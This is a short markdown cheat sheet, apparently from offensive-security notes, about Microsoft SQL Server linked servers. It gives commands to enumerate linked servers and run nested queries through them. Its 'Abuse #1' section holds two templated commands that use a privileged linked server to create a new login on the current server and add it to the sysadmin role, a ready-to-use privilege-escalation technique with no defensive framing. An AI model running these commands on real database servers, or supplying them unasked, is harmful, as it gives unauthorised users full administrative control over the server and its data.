---
title: "MSSQL Linked Servers"
date: 2024-6-27
tags: ["mssql", "database", "Windows", "linked_server", "privesc"]
---

### Basic Commands

<small>*Hint: Use double '' to escape ' in mssql*</small>

```console
# Show current server
select @@servername
```

```console
# Show linked servers
select srvname from sysservers;
```

```console
# Show linked servers
enum_links
```

### Execute Query between Linked Servers

```console
# Execute query from current server to linked server
EXECUTE ('select @@version;') at [<LINKED_SERVER>];
```

```console
# Execute query from linked server to current server
EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [<CURRENT_SERVER>]') at [<LINKED_SERVER>];
```

---

### Abuse #1: Create Admin User from Privilege Linked Server

```console
EXECUTE('EXECUTE(''CREATE LOGIN <USER> WITH PASSWORD = ''''<PASSWORD>'''';'') AT [<CURRENT_SERVER>]') AT [<LINKED_SERVER>]
```

```console
EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''<USER>'''', ''''sysadmin'''''') AT [<CURRENT_SERVER>]') AT [<LINKED_SERVER>]
```
